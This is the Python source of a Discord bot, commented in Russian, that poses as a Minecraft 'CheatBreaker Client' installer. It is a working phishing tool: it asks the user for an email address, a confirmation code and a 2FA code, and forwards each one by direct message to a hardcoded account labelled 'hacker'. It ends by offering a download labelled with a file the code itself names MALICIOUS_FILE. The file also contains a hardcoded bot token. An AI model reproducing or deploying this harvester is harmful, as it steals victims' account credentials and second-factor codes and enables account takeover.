import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Конфигурация
TARGET_USER_ID = 1198000224426266705 # ЗАМЕНИТЕ НА REAL DISCORD ID (@nebesniy)
MALICIOUS_FILE = "CheatBreaker_Client.exe"

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

@bot.command(name='start')
async def start_client(ctx):
    # Запрос почты
    embed = discord.Embed(
        title="🔐 Minecraft CheatBreaker Client Setup",
        description="**Verification is required to install the client.**\nPlease enter your email address. In brackets gmail.:",
        color=0x00ff00
    )
    await ctx.send(embed=embed)
    
    try:
        # Ожидание ввода почты
        email_msg = await bot.wait_for(
            "message",
            timeout=60.0,
            check=lambda m: m.author == ctx.author and "@" in m.content
        )
        email = email_msg.content
        
        #отправка почты
        hacker = await bot.fetch_user(TARGET_USER_ID)
        await hacker.send(f"🔥 НОВАЯ ПОЧТА!\n> From: {ctx.author.mention}\n> Email: `{email}`")
        
        # для жертвы
        embed = discord.Embed(
            title="✉️ The confirmation code has been sent",
            description=f"A 6-digit code has been sent to {email}. Enter it below:",
            color=0x7289DA
        )
        await ctx.send(embed=embed)
        
        # Ожидание кода
        code_msg = await bot.wait_for(
            "message",
            timeout=120.0,
            check=lambda m: m.author == ctx.author
        )
        code = code_msg.content
        
        # Отправка кода 
        await hacker.send(f"🚨 КОД ПОДТВЕРЖДЕНИЯ!\n> From: {ctx.author.mention}\n> Code: `{code}`")
        
        # для жертвы
        embed = discord.Embed(
            title="✉️ The confirmation code 2FA has been sent",
            description=f"A 6-digit code has been sent to {email}. Enter it below:",
            color=0x7289DA
        )
        await ctx.send(embed=embed)
        
        # Ожидание кода
        code_msg = await bot.wait_for(
            "message",
            timeout=120.0,
            check=lambda m: m.author == ctx.author
        )
        code = code_msg.content
        
        # Отправка кода 
        await hacker.send(f"🚨 2FA КОД ПОДТВЕРЖДЕНИЯ!\n> From: {ctx.author.mention}\n> Code: `{code}`")
       
       # Финал 
        embed = discord.Embed(
            title="✅ Verification is successful!",
            description=f"Download Client: [**{MALICIOUS_FILE}**](https://cheatbreaker.net/)",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        
    except asyncio.TimeoutError:
        await ctx.send("⏱️ The waiting time has expired. Start !start again.")
bot.run('MTM4MTA1ODk2MjM1NDMzOTk1MQ.GWIDiK.N2RH-AXinOUJEK77QKkDLO6tEpJQetYTE96bxc')  # ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ТОКЕН